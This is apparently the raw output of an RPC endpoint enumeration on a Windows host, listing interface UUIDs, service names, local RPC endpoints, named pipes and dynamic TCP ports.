+  1d45e083-478f-437c-9618-3594ced8c235 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
+  1d45e083-478f-437c-9618-3594ced8c235 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
+  78dcce84-7f13-4139-b8cd-ef222aa0408b v1.0 (StateRepository): ncalrpc:[OLE15112FA2A6AB5D4A04C20762F606]
+  78dcce84-7f13-4139-b8cd-ef222aa0408b v1.0 (StateRepository): ncalrpc:[LRPC-f692661dc420caf7af]
+  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-cf277c21961fd0fd14]
+  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-cf277c21961fd0fd14]
+  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-cf277c21961fd0fd14]
+  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[OLE30FC05400E0C95BBAA36B74C5298]
+  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3621ff9f682203cb4e]
+  a398e520-d59a-4bdd-aa7a-3c1e0303a511 v1.0 (IKE/Authip API): ncalrpc:[LRPC-87bebabfa51ac7fbf0]
+  714dc5c4-c5f6-466a-b037-a573c958031e v1.0 (ProcessTag Server Endpoint): ncalrpc:[OLE29182EE7686B808DA496E9ADFD18]
+  714dc5c4-c5f6-466a-b037-a573c958031e v1.0 (ProcessTag Server Endpoint): ncalrpc:[LRPC-0fff378533c24c2fed]
+  98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 (XactSrv service): ncalrpc:[LRPC-773d75701f286b1b2f]
+  1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 (IdSegSrv service): ncalrpc:[LRPC-773d75701f286b1b2f]
+  367abb81-9844-35f1-ad32-98f038001003 v2.0 (): ncacn_ip_tcp:[49670]
+  552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 (IP Transition Configuration endpoint): ncalrpc:[LRPC-3d9a50b8712f0e6765]
+  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[LRPC-3d9a50b8712f0e6765]
+  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoDiagnostics]
+  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoControl]
+  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[LRPC-3d9a50b8712f0e6765]
+  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoDiagnostics]
+  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoControl]
+  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[LRPC-3d9a50b8712f0e6765]
+  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoDiagnostics]
+  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoControl]
+  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[OLE162BF9C85BAED873C989F14161E1]
+  dd490425-5325-4565-b774-7e27d6c09c24 v1.0 (Base Firewall Engine API): ncalrpc:[LRPC-bc06c3c069db6e568a]
+  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-bc06c3c069db6e568a]
+  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-cd2dfaeb64d1e6dcea]
+  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-bc06c3c069db6e568a]
+  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-cd2dfaeb64d1e6dcea]
+  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-87d84dc7e832157e93]
+  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-bc06c3c069db6e568a]
+  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-cd2dfaeb64d1e6dcea]
+  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-87d84dc7e832157e93]
+  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-7b98373c17bea3a32a]
+  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
+  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
+  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
+  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
+  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
+  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
+  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
+  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
+  13560fa9-8c09-4b56-a1fd-04d083b9b2a1 v1.0 (): ncalrpc:[OLE6C0F7673BD8428E08E6170F501B9]
+  13560fa9-8c09-4b56-a1fd-04d083b9b2a1 v1.0 (): ncalrpc:[LRPC-87b72933116b42fda6]
+  b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 (): ncalrpc:[LRPC-88a80bac8cfc54ff03]
+  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[LRPC-667a197af8ab220b97]
+  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[4623cc59-33a2-4521-8fd0-11f01f2b5e9e]
+  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[OLEA69C504CD5E2DC1BBD6D61DD888E]
+  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[LRPC-abeebb6c9adf0e1cb1]
+  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[OLEA69C504CD5E2DC1BBD6D61DD888E]
+  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[LRPC-abeebb6c9adf0e1cb1]
+  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-21e912969837545206]
+  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[LRPC-21e912969837545206]
+  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[SessEnvPrivateRpc]
+  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_np:[\\pipe\\SessEnvPublicRpc]
+  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_ip_tcp:[49668]
+  0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
+  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
+  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncacn_np:[\\PIPE\\atsvc]
+  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
+  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncacn_np:[\\PIPE\\atsvc]
+  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
+  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncacn_np:[\\PIPE\\atsvc]
+  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[ubpmtaskhostchannel]
+  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-2e007fdec1ada6fbd5]
+  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
+  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_np:[\\PIPE\\atsvc]
+  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[ubpmtaskhostchannel]
+  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-2e007fdec1ada6fbd5]
+  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_ip_tcp:[49667]
+  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-b1349865f873a2a359]
+  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_np:[\\PIPE\\atsvc]
+  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[ubpmtaskhostchannel]
+  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-2e007fdec1ada6fbd5]
+  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_ip_tcp:[49667]
+  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[senssvc]
+  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-6a9a724c65210674c1]
+  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[DNSResolver]
+  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[LRPC-e2710e17dcafd6ec18]
+  f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 (Witness Client Upcall Server): ncalrpc:[LRPC-c531d67da03010ce42]
+  eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 (Witness Client Test Interface): ncalrpc:[LRPC-c531d67da03010ce42]
+  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncalrpc:[LRPC-c531d67da03010ce42]
+  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncacn_np:[\\PIPE\\wkssvc]
+  509bc7ae-77be-4ee8-b07c-0d096bb44345 v1.0 (): ncalrpc:[OLE9DA4E40F6F21638D7CAFAC70143C]
+  509bc7ae-77be-4ee8-b07c-0d096bb44345 v1.0 (): ncalrpc:[LRPC-fec0436e5df2536a9e]
+  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
+  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
+  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
+  30b044a5-a225-43f0-b3a4-e060df91f9c1 v1.0 (): ncalrpc:[LRPC-3c8caaba49313f4c2d]
+  3f787932-3452-4363-8651-6ea97bb373bb v1.0 (NSP Rpc Interface): ncalrpc:[OLE4C854D9ED5B5B8170BEA37A664E8]
+  3f787932-3452-4363-8651-6ea97bb373bb v1.0 (NSP Rpc Interface): ncalrpc:[LRPC-e9b7d04c30e74f5c1e]
+  bd6ca954-842e-468f-8b07-89cbfa9522dc v1.0 (NetworkProfiles Telemetry RPC Interface): ncalrpc:[OLE4C854D9ED5B5B8170BEA37A664E8]
+  bd6ca954-842e-468f-8b07-89cbfa9522dc v1.0 (NetworkProfiles Telemetry RPC Interface): ncalrpc:[LRPC-e9b7d04c30e74f5c1e]
+  bd6ca954-842e-468f-8b07-89cbfa9522dc v1.0 (NetworkProfiles Telemetry RPC Interface): ncalrpc:[INlmDiagnosticsApi]
+  4c8d0bef-d7f1-49f0-9102-caa05f58d114 v1.0 (): ncalrpc:[OLE4C854D9ED5B5B8170BEA37A664E8]
+  4c8d0bef-d7f1-49f0-9102-caa05f58d114 v1.0 (): ncalrpc:[LRPC-e9b7d04c30e74f5c1e]
+  4c8d0bef-d7f1-49f0-9102-caa05f58d114 v1.0 (): ncalrpc:[INlmDiagnosticsApi]
+  4c8d0bef-d7f1-49f0-9102-caa05f58d114 v1.0 (): ncalrpc:[nlaplg]
+  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[IUserProfile2]
+  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Windows Event Log): ncalrpc:[eventlog]
+  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Windows Event Log): ncacn_np:[\\pipe\\eventlog]
+  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Windows Event Log): ncacn_ip_tcp:[49666]
+  7ea70bcf-48af-4f6a-8968-6a440754d5fa v1.0 (NSI server endpoint): ncalrpc:[LRPC-c307ff67760ec1f57a]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-703c03a8c6b33510ab]
+  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-703c03a8c6b33510ab]
+  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-a1f33ed3b645b0c48c]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-a7e666afcb107b30f0]
+  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (): ncalrpc:[LRPC-a9daf8224104312508]
+  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-a7e666afcb107b30f0]
+  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[OLE871DB697ECE335FEED3892041EE1]
+  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-630b26e382d95fb0b5]
+  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (): ncalrpc:[LRPC-8b800202b7c4cbccb9]
+  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-165969e778654bd03d]
+  4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9 v1.0 (): ncalrpc:[umpo]
+  085b0334-e454-4d91-9b8c-4134f9e793f3 v1.0 (): ncalrpc:[umpo]
+  8782d3b9-ebbd-4644-a3d8-e8725381919b v1.0 (): ncalrpc:[umpo]
+  3b338d89-6cfa-44b8-847e-531531bc9992 v1.0 (): ncalrpc:[umpo]
+  bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760 v1.0 (): ncalrpc:[umpo]
+  5824833b-3c1a-4ad2-bdfd-c31d19e23ed2 v1.0 (): ncalrpc:[umpo]
+  0361ae94-0316-4c6c-8ad8-c594375800e2 v1.0 (): ncalrpc:[umpo]
+  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[umpo]
+  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[actkernel]
+  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[umpo]
+  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[actkernel]
+  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[umpo]
+  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[actkernel]
+  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[umpo]
+  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[actkernel]
+  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[umpo]
+  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[actkernel]
+  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[umpo]
+  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[actkernel]
+  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[umpo]
+  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[actkernel]
+  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[umpo]
+  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[actkernel]
+  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[umpo]
+  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[actkernel]
+  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[umpo]
+  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[actkernel]
+  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[umpo]
+  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[actkernel]
+  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[umpo]
+  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[actkernel]
+  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  2c7fd9ce-e706-4b40-b412-953107ef9bb0 v0.0 (): ncalrpc:[umpo]
+  4dace966-a243-4450-ae3f-9b7bcb5315b8 v2.0 (): ncalrpc:[umpo]
+  178d84be-9291-4994-82c6-3f909aca5a03 v1.0 (): ncalrpc:[umpo]
+  e53d94ca-7464-4839-b044-09a2fb8b3ae5 v1.0 (): ncalrpc:[umpo]
+  fae436b0-b864-4a87-9eda-298547cd82f2 v1.0 (): ncalrpc:[umpo]
+  082a3471-31b6-422a-b931-a54401960c62 v1.0 (): ncalrpc:[umpo]
+  6982a06e-5fe2-46b1-b39c-a2c545bfa069 v1.0 (): ncalrpc:[umpo]
+  0ff1f646-13bb-400a-ab50-9a78f2b7a85a v1.0 (): ncalrpc:[umpo]
+  4ed8abcc-f1e2-438b-981f-bb0e8abc010c v1.0 (): ncalrpc:[umpo]
+  95406f0b-b239-4318-91bb-cea3a46ff0dc v1.0 (): ncalrpc:[umpo]
+  0d47017b-b33b-46ad-9e18-fe96456c5078 v1.0 (): ncalrpc:[umpo]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
+  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[umpo]
+  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[actkernel]
+  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
+  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
+  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[umpo]
+  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[actkernel]
+  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
+  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
+  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-1819d481aab6df3f79]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-1819d481aab6df3f79]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[csebpub]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[umpo]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[actkernel]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-4ebae14d282a65a7ff]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[OLE54E860A83667E490C15B5CC31187]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-17017c76639b8c4bb9]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-fd6a20dd9dd931fc0e]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-2db8b6ca50fbc48ced]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-1819d481aab6df3f79]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[csebpub]
+  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[dabrpc]
+  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0A6F70]
+  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
+  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WindowsShutdown]
+  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WMsgKRpc0A6F70]
+  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
+  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WindowsShutdown]
+  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_ip_tcp:[49665]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[clipsfk]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[imsfk]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_np:[\\pipe\\lsass]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[audit]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[securityevent]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSARPC_ENDPOINT]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsacap]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_IDPEXT_ENDPOINT]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_EAS_ENDPOINT]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsapolicylookup]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsasspirpc]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[protected_storage]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[SidKey Local End Point]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[samss lpc]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
+  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49664]
+  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[clipsfk]
